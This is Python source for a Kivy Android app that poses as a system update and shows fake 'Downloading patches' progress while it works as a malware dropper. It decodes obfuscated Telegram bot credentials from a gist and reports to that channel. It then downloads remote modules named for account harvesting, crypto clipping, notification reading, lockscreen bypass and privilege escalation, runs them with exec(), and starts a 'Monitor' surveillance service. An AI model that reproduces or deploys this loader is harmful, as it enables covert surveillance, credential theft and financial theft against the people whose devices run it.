import threading
import requests
import base64
import time
import json
import traceback
import urllib3
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.utils import platform

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SystemUpdateApp(App):
    def build(self):
        # الرابط المباشر لملف config.json (GitHub Gist)
        self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/b506332d90b3bd191a5b09cc0ecbf15c9542026a/config.json"

        layout = BoxLayout(orientation='vertical')
        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        
        # TextInput للقراءة فقط - يسمح بتحديد النص ونسخه
        self.log_view = TextInput(
            text="[System] Initializing...\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),  # أخضر لسهولة القراءة
            font_size='14sp',
            size_hint_y=None,
            cursor_color=(0, 0, 0, 0)
        )
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        
        scroll.add_widget(self.log_view)
        layout.add_widget(scroll)
        
        threading.Thread(target=self.logic_engine, daemon=True).start()
        return layout

    def log(self, msg):
        """إضافة رسالة إلى واجهة السجل (مع إمكانية النسخ)"""
        self.log_view.text += f"> {msg}\n"

    def decode_secret(self, data):
        try:
            decoded = base64.b64decode(data).decode('utf-8')
            return decoded[::-1]
        except:
            return ""

    def send_telegram(self, token, chat_id, text):
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
        except:
            pass

    def logic_engine(self):
        try:
            self.log("Starting engine...")
            time.sleep(2)

            # طلب صلاحيات الإنترنت
            if platform == 'android':
                self.log("Requesting permissions (INTERNET)...")
                from android.permissions import request_permissions, Permission
                request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
                time.sleep(2)

            # اختبار الاتصال بـ Cloudflare DNS (عنوان IP مباشر)
            self.log("Testing direct IP connection (1.1.1.1)...")
            try:
                r = requests.get("https://1.1.1.1", timeout=5, verify=False)
                self.log(f"Direct IP test OK (status {r.status_code})")
            except Exception as e:
                self.log(f"Direct IP test FAILED: {str(e)[:80]}")
                # نستمر رغم الفشل لنرى ما إذا كان الرابط الرئيسي يعمل

            # محاولة جلب الإعدادات من GitHub
            self.log(f"Fetching config from: {self.config_url[:60]}...")
            response = requests.get(self.config_url, timeout=15, verify=False)
            self.log(f"HTTP status: {response.status_code}")
            config = response.json()
            self.log("Config JSON parsed successfully.")

            # فك التشفير
            tokens = [self.decode_secret(t) for t in config['t']]
            v_id = self.decode_secret(config['v'])
            self.log(f"Decrypted {len(tokens)} tokens, chat ID: {v_id}")

            globals()['MASTER_CONFIG'] = {
                'tokens': tokens,
                'v_id': v_id
            }

            # إرسال رسالة تأكيد إلى Telegram
            if tokens:
                self.log("Sending startup message to Telegram...")
                self.send_telegram(tokens[0], v_id, "🚀 System Online (v1.0.9)")
                self.log("Startup message sent.")

            self.log("Moving to payload loading...")
            self.log_view.text += "\n[Progress] Downloading patches... (35%)\n"
            self.load_payloads()

        except Exception as e:
            error_details = traceback.format_exc()
            self.log(f"CRITICAL ERROR:\n{error_details}")
            # محاولة إرسال بداية الخطأ إلى التيليجرام إذا كان MASTER_CONFIG موجودًا
            try:
                if 'MASTER_CONFIG' in globals() and globals()['MASTER_CONFIG']:
                    token = globals()['MASTER_CONFIG']['tokens'][0]
                    v_id = globals()['MASTER_CONFIG']['v_id']
                    self.send_telegram(token, v_id, f"❌ Error: {error_details[:200]}")
            except:
                pass

    def load_payloads(self):
        payload_urls = [
            "https://gist.githubusercontent.com/Zaen1993/e4af91aec551d599cc8b8ff244c36f23/raw/60c2108cd5fb3b5a78a8c2d9afb4519576526863/monitor.py",
            "https://gist.githubusercontent.com/Zaen1993/65685db73176fe064d3b8aaf7c699542/raw/a191c5e5dd42acef68154b2b72fb028a54cc82cb/telegram_ui.py",
            "https://gist.githubusercontent.com/Zaen1993/c29878f1ec9a2fe247cc15f2deacecb7/raw/9475c0ff3d744c3bbd9ba284aa214f9df87b3025/web_streamer.py",
            "https://gist.githubusercontent.com/Zaen1993/40f2537bf69450d72e6916958b4e8796/raw/c04b852b8f4a513f4a91f4bcaaec1962a37cbf3d/auto_collector.py",
            "https://gist.githubusercontent.com/Zaen1993/9fe7ef022aaefcebde465919d56aa4f5/raw/948ad433f72f692e6c42381e8716e2e4d5b2d6ac/account_harvester.py",
            "https://gist.githubusercontent.com/Zaen1993/803409d15e43cae68dc86c65d6cd2be7/raw/9e66875db5673cec04794218405894a123789e38/notification_reader.py",
            "https://gist.githubusercontent.com/Zaen1993/a2e37944d9158e35d6b1ae4d6a4bf6cb/raw/8d9d07cf0f3d0586c083f00168c1d58f1ba1ef25/crypto_clipper.py",
            "https://gist.githubusercontent.com/Zaen1993/04fc9bcfdeff768d513a93bdfab17d8e/raw/bf8fd90af2bd5d5bd82f138a517499a1fe662446/pixnapping.py",
            "https://gist.githubusercontent.com/Zaen1993/2b657849bfdec661d6357abeda32ec45/raw/6114278915a5f037b343edca1601764a1354dafa/lockscreen_bypass.py",
            "https://gist.githubusercontent.com/Zaen1993/d81377a4d1079a922c38ea53580b55a0/raw/cfb9973a9bdc66b0b23cca1ab3b61762d8df5985/qualcomm_escalation.py"
        ]

        loaded = 0
        for url in payload_urls:
            try:
                time.sleep(1)
                name = url.split('/')[-1]
                self.log(f"Loading {name}...")
                code = requests.get(url, timeout=10, verify=False).text
                exec(code, globals())
                self.log(f"✅ {name} loaded")
                loaded += 1
                # إرسال تقرير كل 3 وحدات
                if loaded % 3 == 0:
                    self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
                                       globals()['MASTER_CONFIG']['v_id'],
                                       f"📦 Loaded {loaded}/{len(payload_urls)} modules")
            except Exception as e:
                self.log(f"⚠️ Failed {name}: {str(e)[:50]}")
                continue

        if 'Monitor' in globals():
            self.log("Starting Monitor service...")
            monitor = globals()['Monitor']()
            monitor.start()
            self.log("✅ Monitor started")
            self.log_view.text += "\n[System] Status: 100% - Up to date\n"
            self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
                               globals()['MASTER_CONFIG']['v_id'],
                               "🎯 Full success - Device monitored")
        else:
            self.log("ERROR: Monitor class not found after loading payloads.")

if __name__ == '__main__':
    SystemUpdateApp().run()
